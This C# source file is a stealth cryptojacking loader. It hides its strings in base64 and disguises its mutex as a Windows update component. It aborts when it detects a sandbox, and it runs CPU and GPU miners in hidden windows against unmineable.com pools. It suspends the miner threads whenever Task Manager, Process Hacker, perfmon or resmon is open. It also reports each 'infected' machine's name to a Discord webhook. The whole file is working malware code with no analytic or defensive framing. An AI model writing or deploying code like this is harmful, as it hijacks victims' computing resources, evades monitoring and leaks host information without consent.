using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class DateFundLoader {
    // API Declarations for Evasion and Stealth
    [DllImport("user32.dll")] private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    [StructLayout(LayoutKind.Sequential)] struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
    [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    
    // APIs for Thread Suspension
    [DllImport("kernel32.dll")] static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
    [DllImport("kernel32.dll")] static extern uint SuspendThread(IntPtr hThread);
    [DllImport("kernel32.dll")] static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32.dll", SetLastError = true)] static extern bool CloseHandle(IntPtr hHandle);
    
    // Anti-Sandbox APIs
    [DllImport("kernel32.dll")] static extern ulong GetTickCount64();

    private const int IDLE_MS = 3 * 60 * 1000;
    private static string Webhook = D("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5OTg5OTcxNTU4MjU1ODIyOC9NXzZidHhwZ1NESDVVQkh2ZjN6YkN5TXIwakVSYTBlWVpLZFE4cFZSNDlrSFJjanpTT1RtLXYxZUlJaE1rclBhUEc4bA==");
    
    private static Mutex mx;
    private static Process cp, gp;
    private static bool isSuspended = false;
    private static Random rnd = new Random();

    private static string D(string b64) { return Encoding.UTF8.GetString(Convert.FromBase64String(b64)); }

    public static void StartMiner(string c, string g, string w) {
        if (IsSandbox()) return; // Anti-Analysis check aborts execution entirely

        try {
            bool n;
            var ms = new MutexSecurity();
            ms.AddAccessRule(new MutexAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), MutexRights.FullControl, AccessControlType.Allow));
            mx = new Mutex(true, D("R2xvYmFsXFxXaW5VcGRhdGVDb29yZE11dGV4"), out n, ms);
            if (!n) return;
            
            Notify(D("8J+SjiAqKk5FVyBXT1JLRVIgSU5GRUNURUQgKFNURUFMVEggTU9ERSkqKg=="), w);
            
            Thread t = new Thread(() => Run(c, g, w));
            t.IsBackground = true;
            t.Start();
        } catch { }
    }

    private static bool IsSandbox() {
        try {
            // Check 1: Uptime less than 10 minutes (common in automated analysis environments)
            if (GetTickCount64() < 600000) return true;
            
            // Check 2: Less than 2 processors (Most VMs used for analysis only allocate 1 core)
            if (Environment.ProcessorCount < 2) return true;
            
            // Check 3: Mouse hasn't moved recently (Simulating human interaction)
            LASTINPUTINFO l = new LASTINPUTINFO();
            l.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
            if (GetLastInputInfo(ref l)) {
                if (Environment.TickCount - l.dwTime > 300000) return true; // No input for 5 mins since boot
            }
        } catch { }
        return false;
    }

    private static void Run(string c, string g, string w) {
        bool wi = false, wb = false;
        string[] badProcs = { D("dGFza21ncg=="), D("cHJvY2Vzc2hhY2tlcg=="), D("cGVyZm1vbg=="), D("cmVzbW9u") }; 

        while (true) {
            try {
                LASTINPUTINFO l = new LASTINPUTINFO();
                l.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
                bool ii = GetLastInputInfo(ref l) && (Environment.TickCount - (int)l.dwTime) > IDLE_MS;
                
                bool danger = IsBadAppOpen(badProcs);
                bool ob = SystemInformation.PowerStatus.PowerLineStatus == PowerLineStatus.Offline;

                // THREAD SUSPENSION INSTEAD OF KILLING
                // If danger is detected, suspend the threads. CPU drops to 0% instantly.
                // No process creation/termination logs are generated in Event Viewer.
                if (danger) {
                    if (!isSuspended) SuspendMiners();
                    Thread.Sleep(2000);
                    continue;
                } else if (isSuspended) {
                    ResumeMiners();
                }
                
                if (ii != wi || ob != wb || cp == null || cp.HasExited || (gp == null && !string.IsNullOrEmpty(g))) {
                    KillMiners(); // Only kill if we actually need to restart to change mining intensity
                    
                    int th = ob ? 1 : (ii ? 25 : 15);
                    string mName = Environment.MachineName.Replace(" ", "_");
                    
                    string ca = string.Format(D("LW8gcngudW5taW5lYWJsZS5jb206NDQzIC11IEJUQzp7MH0uV2luU3lzX3sxfV9DIC1wIHggLWEgcnggLWsgLS10bHMgLS1jcHUtbWF4LXRocmVhZHMtaGludCB7Mn0gLS1uby1tc3IgLS1uby1odWdlLXBhZ2VzIC0tY3B1LXlpZWxk"), w, mName, th);
                    
                    cp = new Process();
                    cp.StartInfo.FileName = c;
                    cp.StartInfo.Arguments = ca;
                    cp.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    cp.StartInfo.CreateNoWindow = true;
                    cp.StartInfo.UseShellExecute = false;
                    cp.Start();
                    try { cp.PriorityClass = ProcessPriorityClass.Idle; } catch { }

                    if (!string.IsNullOrEmpty(g) && File.Exists(g)) {
                        string ga = string.Format(D("LS1hbGdvIEVUQ0hBU0ggLS1zZXJ2ZXIgZXRjaGFzaC51bm1pbmVhYmxlLmNvbTozMzMzIC0tdXNlciBCVEM6ezB9LldpblN5c197MX1fRyAtLXBhc3MgeCAtLWludGVuc2l0eSB7Mn0="), w, mName, ii ? "30" : "10");
                        gp = new Process();
                        gp.StartInfo.FileName = g;
                        gp.StartInfo.Arguments = ga;
                        gp.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        gp.StartInfo.CreateNoWindow = true;
                        gp.StartInfo.UseShellExecute = false;
                        gp.Start();
                        try { gp.PriorityClass = ProcessPriorityClass.Idle; } catch { }
                    }
                }
                
                wi = ii; wb = ob;
            } catch { }
            
            Thread.Sleep(2000 + rnd.Next(1000));
        }
    }

    private static void SuspendMiners() {
        SetThreadState(cp, true);
        SetThreadState(gp, true);
        isSuspended = true;
    }

    private static void ResumeMiners() {
        SetThreadState(cp, false);
        SetThreadState(gp, false);
        isSuspended = false;
    }

    private static void SetThreadState(Process p, bool suspend) {
        if (p == null || p.HasExited) return;
        try {
            foreach (ProcessThread pT in p.Threads) {
                // 0x0002 is THREAD_SUSPEND_RESUME permission
                IntPtr pOpenThread = OpenThread(0x0002, false, (uint)pT.Id);
                if (pOpenThread == IntPtr.Zero) continue;
                
                if (suspend) SuspendThread(pOpenThread);
                else ResumeThread(pOpenThread);
                
                CloseHandle(pOpenThread);
            }
        } catch { }
    }

    private static void KillMiners() {
        if (cp != null && !cp.HasExited) try { cp.Kill(); } catch { }
        if (gp != null && !gp.HasExited) try { gp.Kill(); } catch { }
        isSuspended = false;
    }

    private static bool IsBadAppOpen(string[] badProcs) {
        try {
            IntPtr hWnd = GetForegroundWindow();
            if (hWnd != IntPtr.Zero) {
                StringBuilder sb = new StringBuilder(256);
                if (GetWindowText(hWnd, sb, 256) > 0) {
                    string title = sb.ToString().ToUpper();
                    if (title.Contains(D("VEFTSyBNQU5BR0VS")) || title.Contains(D("UFJPQ0VTUyBIQUNLRVI="))) return true;
                }
            }

            foreach (var p in Process.GetProcesses()) {
                string n = p.ProcessName.ToLower();
                foreach(var bad in badProcs) {
                    if (n.Contains(bad)) return true;
                }
            }
        } catch { }
        return false;
    }

    private static void Notify(string s, string w) {
        new Thread(() => {
            try {
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 | (SecurityProtocolType)3072 | (SecurityProtocolType)12288;
                string j = D("eydlbWJlZHMnOlt7J3RpdGxlJzon") + s + D("JywnY29sb3InOjI4OTU2NjcsJ2ZpZWxkcyc6W3snbmFtZSc6J1dvcmtlcicsJ3ZhbHVlJzonYA==") + Environment.MachineName + D("YCd9XSwndGltZXN0YW1wJzon") + DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ") + D("J31dfQ==");
                j = j.Replace("'", "\"");
                
                using (WebClient c = new WebClient()) { 
                    c.Headers[HttpRequestHeader.ContentType] = D("YXBwbGljYXRpb24vanNvbg=="); 
                    c.UploadString(Webhook, j); 
                }
            } catch { }
        }) { IsBackground = true }.Start();
    }
}

